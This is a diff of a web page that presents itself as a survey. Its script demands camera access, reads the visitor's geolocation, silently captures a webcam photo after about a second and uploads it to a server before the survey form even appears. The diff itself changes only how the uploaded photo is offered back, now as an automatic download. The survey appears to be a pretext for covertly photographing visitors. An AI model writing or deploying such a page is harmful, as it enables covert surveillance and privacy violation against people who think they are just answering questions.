@@ -76,39 +76,35 @@ button { padding: 10px 20px; cursor: pointer; background: #4CAF50; color: white;
   <button type="submit">Submit</button>
 </form>
 
-<p id="thanksMessage" style="display:none;">
-  Thank you for completing the survey!<br>
-  <a id="downloadLink" href="#" style="display:none;">Download your photo</a>
-</p>
+<p id="thanksMessage" style="display:none;">Thank you for completing the survey!</p>
 
 <script>
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const form = document.getElementById("surveyForm");
 const thanks = document.getElementById("thanksMessage");
-const downloadLink = document.getElementById("downloadLink");
-let lastUploadUrl = "";
 
-// Camera initialization
+// Camera init
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
-    // Geolocation (optional)
+    // Optional geolocation
     navigator.geolocation.getCurrentPosition(
-      (pos) => console.log("Location:", pos.coords.latitude, pos.coords.longitude),
+      pos => console.log("Location:", pos.coords.latitude, pos.coords.longitude),
       () => console.log("Location denied")
     );
 
-    setTimeout(() => captureAndSend(stream), 1200);
+    // Capture photo after 1 second
+    setTimeout(() => captureAndSend(stream), 1000);
 
   } catch (err) {
     alert("Camera permission is required to continue.");
   }
 }
 
-// Capture photo and upload
+// Capture and send
 function captureAndSend(stream) {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -124,14 +120,20 @@ function captureAndSend(stream) {
       const data = await res.json();
 
       if (data.status === "success") {
-        lastUploadUrl = data.downloadUrl;
+        // Auto-download
+        const a = document.createElement("a");
+        a.href = data.downloadUrl;
+        a.download = ""; // triggers download
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+
         document.querySelector('h2').style.display = 'none';
         document.querySelector('p').style.display = 'none';
         form.style.display = 'block';
       } else {
         alert("Upload failed.");
       }
-
     } catch (err) {
       alert("Upload failed. Refresh and try again.");
     }
@@ -141,17 +143,10 @@ function captureAndSend(stream) {
 }
 
 // Form submission
-form.addEventListener("submit", function(e) {
+form.addEventListener("submit", e => {
   e.preventDefault();
   form.style.display = "none";
   thanks.style.display = "block";
-
-  if (lastUploadUrl) {
-    downloadLink.href = lastUploadUrl;
-    downloadLink.style.display = "inline-block";
-    downloadLink.textContent = "Download your photo";
-    downloadLink.download = ""; // enable browser download
-  }
 });
 
 init();
